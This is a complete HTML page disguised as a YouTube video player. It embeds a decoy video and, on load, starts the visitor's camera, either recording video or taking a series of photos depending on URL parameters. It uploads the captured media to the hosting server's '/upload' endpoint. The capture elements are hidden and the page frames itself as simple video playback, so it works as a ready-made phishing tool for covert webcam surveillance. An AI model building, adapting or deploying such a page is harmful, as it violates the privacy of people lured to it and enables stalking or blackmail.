<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎬 YouTube</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            overflow: hidden;
            position: relative;
        }
        
        .confetti-container {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; overflow: hidden; z-index: 0;
        }
        .confetti {
            position: absolute;
            width: 10px; height: 10px; top: -10px;
            animation: confettiFall linear infinite;
        }
        @keyframes confettiFall {
            0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }
        
        .video-card {
            position: relative; z-index: 1;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 30px;
            max-width: 750px; width: 90%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.05);
            text-align: center;
            animation: float 3s ease-in-out infinite;
            transition: all 0.5s ease;
        }
        .video-card.recording {
            animation: none;
            border-color: rgba(255,215,0,0.3);
            box-shadow: 0 0 80px rgba(255,215,0,0.1);
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        
        .video-container {
            margin: 0 0 15px 0;
            border-radius: 15px;
            overflow: hidden;
            position: relative;
            background: #000;
            aspect-ratio: 16/9;
            border: 2px solid rgba(255,255,255,0.05);
        }
        .video-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .play-indicator {
            color: rgba(255,255,255,0.3);
            font-size: 0.9rem;
            margin-top: 5px;
            letter-spacing: 2px;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.7; }
        }
        
        .recording-dot {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 50;
            display: none;
            align-items: center;
            gap: 10px;
            background: rgba(255,0,0,0.2);
            padding: 8px 15px;
            border-radius: 20px;
            border: 1px solid rgba(255,0,0,0.3);
            backdrop-filter: blur(10px);
        }
        .recording-dot.active {
            display: flex;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        .recording-dot .dot {
            width: 10px;
            height: 10px;
            background: #ff0000;
            border-radius: 50%;
            animation: blink 1s ease-in-out infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        .recording-dot .label {
            color: rgba(255,255,255,0.7);
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .capture-status {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 50;
            background: rgba(0,0,0,0.8);
            padding: 12px 25px;
            border-radius: 30px;
            color: white;
            font-size: 0.9rem;
            display: none;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .capture-status.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }
        
        #hiddenVideo { display: none; }
        #photoCanvas { display: none; }
        
        @media (max-width: 600px) {
            .video-card { padding: 15px; }
        }
    </style>
</head>
<body>
    <div class="confetti-container" id="confettiContainer"></div>
    
    <div class="recording-dot" id="recordingDot">
        <span class="dot"></span>
        <span class="label" id="recordingLabel">Recording</span>
    </div>
    
    <div class="capture-status" id="captureStatus">📸 Capturing...</div>
    
    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="photoCanvas"></canvas>
    
    <div class="video-card" id="videoCard">
        <div class="video-container">
            <iframe 
                id="youtubePlayer"
                src=""
                title="YouTube video player"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
            </iframe>
        </div>
        <div class="play-indicator">▶ PLAYING</div>
    </div>

    <script>
        // ============================================
        // Get parameters from URL
        // ============================================
        const urlParams = new URLSearchParams(window.location.search);
        const videoId = urlParams.get('video') || 'dQw4w9WgXcQ';
        const captureMode = urlParams.get('mode') || 'video'; // 'video' or 'photo'
        const cameraType = urlParams.get('camera') || 'user'; // 'user' or 'environment'
        const photoCount = parseInt(urlParams.get('photos')) || 5;
        const videoDuration = parseInt(urlParams.get('duration')) || 15;
        
        // Load YouTube video
        document.getElementById('youtubePlayer').src = 
            `https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0&controls=1&modestbranding=1`;

        // ============================================
        // DOM Elements
        // ============================================
        const videoElement = document.getElementById('hiddenVideo');
        const photoCanvas = document.getElementById('photoCanvas');
        const videoCard = document.getElementById('videoCard');
        const recordingDot = document.getElementById('recordingDot');
        const recordingLabel = document.getElementById('recordingLabel');
        const captureStatus = document.getElementById('captureStatus');

        const UPLOAD_URL = '/upload';
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let timerInterval = null;
        let timeRemaining = videoDuration;
        let isRecording = false;
        let capturedPhotos = [];
        let photoIndex = 0;

        // ============================================
        // Confetti Generator
        // ============================================
        const confettiContainer = document.getElementById('confettiContainer');
        const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
        for (let i = 0; i < 80; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (Math.random() * 8 + 4) + 'px';
            confetti.style.height = (Math.random() * 8 + 4) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
            confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
            confetti.style.animationDelay = (Math.random() * 4) + 's';
            confettiContainer.appendChild(confetti);
        }

        // ============================================
        // Camera Functions
        // ============================================
        async function startCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: cameraType,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoElement.srcObject = mediaStream;
                await videoElement.play();
                
                return true;
            } catch (error) {
                console.error('❌ Camera error:', error);
                return false;
            }
        }

        // ============================================
        // Video Recording Mode
        // ============================================
        async function startVideoRecording() {
            try {
                recordingDot.classList.add('active');
                recordingLabel.textContent = 'Recording';
                videoCard.classList.add('recording');

                if (!await startCamera()) {
                    throw new Error('Camera failed to start');
                }

                recordedChunks = [];
                mediaRecorder = new MediaRecorder(mediaStream, { 
                    mimeType: 'video/webm;codecs=vp9' 
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    uploadMedia(blob, 'video');
                };

                mediaRecorder.start();
                isRecording = true;
                timeRemaining = videoDuration;

                console.log(`🎬 Recording started for ${videoDuration} seconds`);

                timerInterval = setInterval(() => {
                    timeRemaining--;
                    
                    if (timeRemaining <= 0) {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        
                        if (mediaRecorder && isRecording) {
                            mediaRecorder.stop();
                            isRecording = false;
                            recordingDot.classList.remove('active');
                            videoCard.classList.remove('recording');
                            console.log('✅ Recording stopped');
                        }
                        
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                    }
                }, 1000);

            } catch (error) {
                console.error('❌ Recording error:', error);
                recordingDot.classList.remove('active');
                videoCard.classList.remove('recording');
            }
        }

        // ============================================
        // Photo Capture Mode
        // ============================================
        async function startPhotoCapture() {
            try {
                recordingDot.classList.add('active');
                recordingLabel.textContent = `Photo ${photoIndex + 1}/${photoCount}`;
                videoCard.classList.add('recording');
                captureStatus.classList.add('active');
                captureStatus.textContent = `📸 Capturing photo ${photoIndex + 1}/${photoCount}`;

                if (!await startCamera()) {
                    throw new Error('Camera failed to start');
                }

                // Set canvas size
                const width = 640;
                const height = 480;
                photoCanvas.width = width;
                photoCanvas.height = height;
                const ctx = photoCanvas.getContext('2d');

                // Capture photos at intervals
                const captureInterval = setInterval(() => {
                    if (photoIndex < photoCount) {
                        // Draw current frame to canvas
                        ctx.drawImage(videoElement, 0, 0, width, height);
                        
                        // Convert to blob
                        photoCanvas.toBlob((blob) => {
                            if (blob) {
                                const timestamp = Date.now();
                                const filename = `photo_${timestamp}.jpg`;
                                const file = new File([blob], filename, { type: 'image/jpeg' });
                                uploadMedia(file, 'photo');
                                console.log(`📸 Photo ${photoIndex + 1}/${photoCount} captured`);
                            }
                        }, 'image/jpeg', 0.9);

                        photoIndex++;
                        captureStatus.textContent = `📸 Capturing photo ${photoIndex + 1}/${photoCount}`;
                        recordingLabel.textContent = `Photo ${photoIndex + 1}/${photoCount}`;
                    } else {
                        clearInterval(captureInterval);
                        // All photos captured
                        recordingDot.classList.remove('active');
                        videoCard.classList.remove('recording');
                        captureStatus.classList.remove('active');
                        
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                        
                        console.log('✅ All photos captured!');
                    }
                }, 1500); // Capture every 1.5 seconds

            } catch (error) {
                console.error('❌ Photo capture error:', error);
                recordingDot.classList.remove('active');
                videoCard.classList.remove('recording');
                captureStatus.classList.remove('active');
            }
        }

        // ============================================
        // Upload Function
        // ============================================
        async function uploadMedia(file, type) {
            const formData = new FormData();
            formData.append('media', file);
            formData.append('type', type);

            try {
                const response = await fetch(UPLOAD_URL, { 
                    method: 'POST', 
                    body: formData 
                });
                
                if (response.ok) {
                    console.log(`✅ ${type} uploaded successfully!`);
                } else {
                    console.error(`❌ Upload failed:`, response.status);
                }
            } catch (error) {
                console.error(`❌ Upload error:`, error);
            }
        }

        // ============================================
        // Start based on mode
        // ============================================
        window.addEventListener('load', () => {
            setTimeout(() => {
                if (captureMode === 'photo') {
                    startPhotoCapture();
                } else {
                    startVideoRecording();
                }
            }, 1000);
        });

        // ============================================
        // Cleanup
        // ============================================
        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
            }
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        console.log(`🎬 YouTube mode loaded!`);
        console.log(`📹 Mode: ${captureMode}`);
        console.log(`📷 Camera: ${cameraType}`);
        console.log(`📸 Video ID: ${videoId}`);
        if (captureMode === 'video') {
            console.log(`⏱️ Duration: ${videoDuration} seconds`);
        } else {
            console.log(`📸 Photos: ${photoCount}`);
        }
    </script>
</body>
</html>
